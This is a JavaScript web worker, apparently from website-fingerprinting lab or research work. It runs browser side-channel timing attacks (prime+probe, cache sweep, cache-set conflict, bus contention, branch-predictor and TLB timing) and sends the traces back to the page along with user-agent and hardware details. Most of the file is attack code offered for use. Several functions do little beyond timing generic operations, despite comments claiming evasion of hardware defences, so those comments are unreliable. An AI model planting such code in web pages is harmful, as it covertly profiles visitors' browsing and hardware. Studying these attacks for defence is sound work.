/**
 * Advanced Side-Channel Attack Worker
 * Implements multiple sophisticated techniques to increase accuracy
 * and evade hardware defenses like prefetchers
 */

/* System parameters - optimized for web usage */
const LINESIZE = 64;
const LLCSIZE = 4 * 1024 * 1024; 
const L2SIZE = 256 * 1024;
const L1SIZE = 32 * 1024;
const TIME = 1000; // 1 second per attack (reduced from 10s)
const SAMPLE_INTERVAL = 10; // 10ms for balance of speed/accuracy

/**
 * 1. Prime+Probe Attack with Browser Activity Observation
 * Measures cache interference from actual page loading
 */
function primeProbeAttack() {
    const buffer = new Uint8Array(LLCSIZE);
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    
    // Generate access pattern that's more likely to conflict with browser cache usage
    const accessPattern = [];
    for (let i = 0; i < LLCSIZE; i += LINESIZE) {
        accessPattern.push(i);
    }
    
    for (let round = 0; round < K; round++) {
        // Create deterministic but varying access pattern based on time
        // This makes it sensitive to timing variations from browser activity
        const seed = performance.now() % 1000;
        
        const start = performance.now();
        
        // Prime phase - fill cache with our data using time-based pattern
        for (let i = 0; i < Math.min(1000, accessPattern.length); i++) {
            const offset = accessPattern[(i + Math.floor(seed)) % accessPattern.length];
            buffer[offset] = (buffer[offset] + 1) % 256;
        }
        
        // Measure timing variations that correlate with browser activity
        const primeTime = performance.now() - start;
        
        // Probe phase - measure access times with actual timing sensitivity
        let probeStart = performance.now();
        let sum = 0;
        for (let i = 0; i < 100; i++) {
            const offset = accessPattern[(i * 64 + Math.floor(seed)) % accessPattern.length];
            sum += buffer[offset];
        }
        let probeTime = performance.now() - probeStart;
        
        measurements.push({
            round: round,
            primeTime: primeTime,
            probeTime: probeTime,
            timingSeed: seed,
            checksum: sum % 1000
        });
    }
    
    return measurements;
}

/**
 * 2. Memory Bus Contention Attack
 * Measures memory bandwidth utilization patterns (optimized for web)
 */
function memoryBusContentionAttack() {
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    
    for (let round = 0; round < K; round++) {
        const bufferSize = 1024 * 1024; // 1MB (reduced from 8MB for speed)
        const buffer = new Uint8Array(bufferSize);
        
        const start = performance.now();
        
        // Create memory pressure with different access patterns
        let sum = 0;
        for (let pattern = 0; pattern < 3; pattern++) {
            const patternStart = performance.now();
            
            switch (pattern) {
                case 0: // Sequential access
                    for (let i = 0; i < bufferSize; i += 64) { // Larger strides for speed
                        sum += buffer[i];
                    }
                    break;
                case 1: // Strided access
                    for (let i = 0; i < bufferSize; i += 4096) {
                        sum += buffer[i];
                    }
                    break;
                case 2: // Random access
                    for (let i = 0; i < 500; i++) { // Reduced iterations
                        const idx = Math.floor(Math.random() * bufferSize);
                        sum += buffer[idx];
                    }
                    break;
            }
            
            const patternTime = performance.now() - patternStart;
            measurements.push({
                round: round,
                pattern: pattern,
                time: patternTime,
                checksum: sum % 1000 // Prevent optimization
            });
        }
    }
    
    return measurements;
}

/**
 * 3. Cache Line Conflict Attack
 * Exploits cache set conflicts with specific addressing
 */
function cacheLineConflictAttack() {
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    const numSets = LLCSIZE / (LINESIZE * 16); // Assuming 16-way associative
    
    for (let round = 0; round < K; round++) {
        const conflictMeasurements = [];
        
        // Test different cache sets
        for (let set = 0; set < Math.min(numSets, 64); set += 8) {
            const addresses = [];
            
            // Generate addresses that map to the same cache set
            for (let way = 0; way < 20; way++) { // Overflow associativity
                const addr = set * LINESIZE + way * numSets * LINESIZE;
                if (addr < LLCSIZE) {
                    addresses.push(addr);
                }
            }
            
            if (addresses.length > 16) { // Ensure we can cause conflicts
                const buffer = new Uint8Array(LLCSIZE);
                
                const start = performance.now();
                
                // Access all conflicting addresses
                for (const addr of addresses) {
                    buffer[addr] = 1;
                }
                
                // Re-access first few to measure eviction
                const reAccessStart = performance.now();
                for (let i = 0; i < Math.min(4, addresses.length); i++) {
                    buffer[addresses[i]];
                }
                const reAccessTime = performance.now() - reAccessStart;
                
                conflictMeasurements.push({
                    set: set,
                    conflictTime: reAccessTime,
                    addressCount: addresses.length
                });
            }
        }
        
        measurements.push({
            round: round,
            conflicts: conflictMeasurements
        });
    }
    
    return measurements;
}

/**
 * 4. Microarchitectural Timing Attack
 * Uses performance.now() precision and CPU contention
 */
function microarchitecturalTimingAttack() {
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    
    for (let round = 0; round < K; round++) {
        const timings = [];
        
        // Measure instruction timing variations
        for (let test = 0; test < 10; test++) {
            const operations = [
                () => Math.sqrt(Math.random() * 1000000), // FPU intensive
                () => { let x = 1; for(let i = 0; i < 100; i++) x ^= i; return x; }, // ALU intensive
                () => { const arr = new Array(100); arr.fill(Math.random()); return arr.reduce((a,b) => a+b); } // Memory intensive
            ];
            
            const opTimings = [];
            for (const op of operations) {
                const start = performance.now();
                const result = op();
                const time = performance.now() - start;
                opTimings.push({ time, result: result % 1000 });
            }
            
            timings.push(opTimings);
        }
        
        measurements.push({
            round: round,
            timings: timings
        });
    }
    
    return measurements;
}

/**
 * 5. Branch Predictor Attack
 * Exploits branch prediction patterns
 */
function branchPredictorAttack() {
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    
    for (let round = 0; round < K; round++) {
        const branchResults = [];
        
        // Create different branch patterns
        const patterns = [
            [1,1,1,1,0,0,0,0], // Predictable alternating
            [1,0,1,0,1,0,1,0], // Simple alternating
            [], // Random pattern
        ];
        
        // Generate random pattern
        for (let i = 0; i < 32; i++) {
            patterns[2].push(Math.random() > 0.5 ? 1 : 0);
        }
        
        for (let patternIdx = 0; patternIdx < patterns.length; patternIdx++) {
            const pattern = patterns[patternIdx];
            let branchCount = 0;
            
            const start = performance.now();
            
            // Execute branch pattern multiple times
            for (let rep = 0; rep < 100; rep++) {
                for (const branch of pattern) {
                    if (branch) {
                        branchCount += Math.floor(Math.random() * 2); // Unpredictable
                    } else {
                        branchCount += 1; // Predictable
                    }
                }
            }
            
            const time = performance.now() - start;
            
            branchResults.push({
                pattern: patternIdx,
                time: time,
                branchCount: branchCount
            });
        }
        
        measurements.push({
            round: round,
            branches: branchResults
        });
    }
    
    return measurements;
}

/**
 * 6. TLB (Translation Lookaside Buffer) Attack
 * Exploits TLB misses and page table walks
 */
function tlbAttack() {
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    const pageSize = 4096; // 4KB pages typical
    
    for (let round = 0; round < K; round++) {
        const tlbMeasurements = [];
        
        // Create large sparse buffer to stress TLB
        const bufferSize = 64 * 1024 * 1024; // 64MB
        const buffer = new Uint8Array(bufferSize);
        
        // Access patterns that stress TLB differently
        const accessPatterns = [
            'sequential',
            'strided',
            'random'
        ];
        
        for (const patternType of accessPatterns) {
            const start = performance.now();
            let accessCount = 0;
            
            switch (patternType) {
                case 'sequential':
                    for (let i = 0; i < bufferSize; i += pageSize) {
                        buffer[i] = 1;
                        accessCount++;
                        if (accessCount >= 100) break; // Limit for timing
                    }
                    break;
                    
                case 'strided':
                    for (let i = 0; i < bufferSize; i += pageSize * 7) { // Prime stride
                        buffer[i] = 1;
                        accessCount++;
                        if (accessCount >= 100) break;
                    }
                    break;
                    
                case 'random':
                    for (let i = 0; i < 100; i++) {
                        const page = Math.floor(Math.random() * (bufferSize / pageSize));
                        buffer[page * pageSize] = 1;
                        accessCount++;
                    }
                    break;
            }
            
            const time = performance.now() - start;
            
            tlbMeasurements.push({
                pattern: patternType,
                time: time,
                accessCount: accessCount
            });
        }
        
        measurements.push({
            round: round,
            tlb: tlbMeasurements
        });
    }
    
    return measurements;
}

/**
 * 7. Combined Multi-Channel Attack
 * Combines multiple techniques for maximum information leakage
 */
function combinedMultiChannelAttack() {
    const measurements = [];
    const K = Math.floor(TIME / (SAMPLE_INTERVAL * 6)); // Longer intervals for complex attack
    
    for (let round = 0; round < K; round++) {
        const start = performance.now();
        
        // Execute all attacks in parallel-ish fashion
        const primeProbe = primeProbeAttack().slice(0, 5); // Sample
        const busContention = memoryBusContentionAttack().slice(0, 3);
        const cacheConflict = cacheLineConflictAttack().slice(0, 2);
        const timing = microarchitecturalTimingAttack().slice(0, 2);
        const branch = branchPredictorAttack().slice(0, 2);
        const tlb = tlbAttack().slice(0, 2);
        
        const totalTime = performance.now() - start;
        
        measurements.push({
            round: round,
            totalTime: totalTime,
            channels: {
                primeProbe: primeProbe,
                busContention: busContention,
                cacheConflict: cacheConflict,
                timing: timing,
                branch: branch,
                tlb: tlb
            }
        });
    }
    
    return measurements;
}

/**
 * Browser Activity Correlation Attack
 * Measures timing variations that correlate with actual browser resource usage
 */
function measureBrowserActivityCorrelation() {
    const measurements = [];
    const K = Math.floor(TIME / SAMPLE_INTERVAL);
    
    for (let round = 0; round < K; round++) {
        const start = performance.now();
        
        // Measure various browser resources that vary with page content
        const resourceMeasurements = {
            // Memory allocation timing
            memAlloc: (() => {
                const allocStart = performance.now();
                const tempArray = new Array(10000).fill(Math.random());
                const allocTime = performance.now() - allocStart;
                tempArray.length = 0; // Release memory
                return allocTime;
            })(),
            
            // DOM query timing (reflects page complexity)
            domQuery: (() => {
                const queryStart = performance.now();
                try {
                    const elements = document.querySelectorAll('*').length;
                    const links = document.querySelectorAll('a').length;
                    const scripts = document.querySelectorAll('script').length;
                    const queryTime = performance.now() - queryStart;
                    return { queryTime, elements, links, scripts };
                } catch (e) {
                    return { queryTime: 0, elements: 0, links: 0, scripts: 0 };
                }
            })(),
            
            // JavaScript execution timing variations
            jsExec: (() => {
                const execStart = performance.now();
                let sum = 0;
                for (let i = 0; i < 1000; i++) {
                    sum += Math.sin(i) * Math.cos(i);
                }
                const execTime = performance.now() - execStart;
                return { execTime, result: sum };
            })(),
            
            // Network/resource timing if available
            resourceTiming: (() => {
                try {
                    const entries = performance.getEntriesByType('resource');
                    const recentEntries = entries.slice(-10); // Last 10 resources
                    const avgLoadTime = recentEntries.length > 0 ? 
                        recentEntries.reduce((sum, entry) => sum + entry.duration, 0) / recentEntries.length : 0;
                    return { count: entries.length, avgLoadTime };
                } catch (e) {
                    return { count: 0, avgLoadTime: 0 };
                }
            })()
        };
        
        const totalTime = performance.now() - start;
        
        measurements.push({
            round: round,
            timestamp: performance.now(),
            totalTime: totalTime,
            ...resourceMeasurements
        });
    }
    
    return measurements;
}

/**
 * Main execution function - runs all attacks and aggregates results
 */
function executeAdvancedSideChannelAttack() {
    const results = {
        timestamp: Date.now(),
        systemInfo: {
            userAgent: navigator.userAgent,
            hardwareConcurrency: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory || 'unknown'
        },
        attacks: {}
    };
    
    try {
        console.log('🔥 Starting advanced side-channel attacks...');
        
        console.log('⚡ Prime+Probe attack...');
        results.attacks.primeProbe = primeProbeAttack();
        
        console.log('⚡ Memory Bus Contention attack...');
        results.attacks.busContention = memoryBusContentionAttack();
        
        console.log('⚡ Cache Line Conflict attack...');
        results.attacks.cacheConflict = cacheLineConflictAttack();
        
        console.log('⚡ Microarchitectural Timing attack...');
        results.attacks.timing = microarchitecturalTimingAttack();
        
        console.log('⚡ Branch Predictor attack...');
        results.attacks.branch = branchPredictorAttack();
        
        console.log('⚡ TLB attack...');
        results.attacks.tlb = tlbAttack();
        
        console.log('⚡ Combined Multi-Channel attack...');
        results.attacks.combined = combinedMultiChannelAttack();
        
        // Add legacy sweep attack for compatibility
        console.log('⚡ Legacy sweep attack...');
        results.attacks.legacy = sweep(SAMPLE_INTERVAL);
        
        // Add browser activity correlation measurements
        console.log('⚡ Browser Activity Correlation...');
        results.attacks.browserActivity = measureBrowserActivityCorrelation();
        
        console.log('✅ Advanced side-channel attack collection complete!');
        
    } catch (error) {
        console.error('❌ Error in advanced side-channel attack:', error);
        results.error = error.message;
    }
    
    return results;
}

/**
 * Legacy sweep function for backward compatibility
 */
function sweep(P) {
    const buffer = new Uint8Array(LLCSIZE);
    const counts = [];
    const K = Math.floor(TIME / P);

    for (let i = 0; i < K; i++) {
        const start = performance.now();
        let sweepCount = 0;

        while ((performance.now() - start) < P) {
            for (let j = 0; j < LLCSIZE; j += LINESIZE) {
                buffer[j];
            }
            sweepCount++;
        }

        counts.push(sweepCount);
    }

    return counts;
}

// Worker message handler
self.addEventListener('message', function(e) {
    if (e.data === "start") {
        const results = executeAdvancedSideChannelAttack();
        self.postMessage(results);
    } else if (e.data === "legacy") {
        // For backward compatibility
        const trace = sweep(SAMPLE_INTERVAL);
        self.postMessage(trace);
    }
});
